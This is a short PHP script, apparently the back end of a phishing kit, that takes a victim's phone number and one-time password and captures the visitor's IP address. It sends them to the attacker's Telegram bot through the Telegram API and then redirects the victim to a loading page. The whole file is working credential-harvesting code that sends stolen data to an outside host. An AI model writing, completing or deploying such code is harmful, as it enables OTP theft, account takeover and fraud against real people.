<?php
session_start();
include 'config.php';

$phone = $_SESSION['phone'] ?? 'Tidak diketahui';
$otp = $_POST['otp'] ?? 'Kosong';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

// Kirim data lengkap ke Telegram
$message = "🔐 DATA LENGKAP\n";
$message .= "═══════════════\n";
$message .= "📱 Nomor: $phone\n";
$message .= "🔑 OTP: $otp\n";
$message .= "🌐 IP: $ip\n";
$message .= "🕐 Waktu: $time\n";
$message .= "═══════════════";

file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

// Redirect ke halaman loading
header("Location: loading.html");
exit;
?>
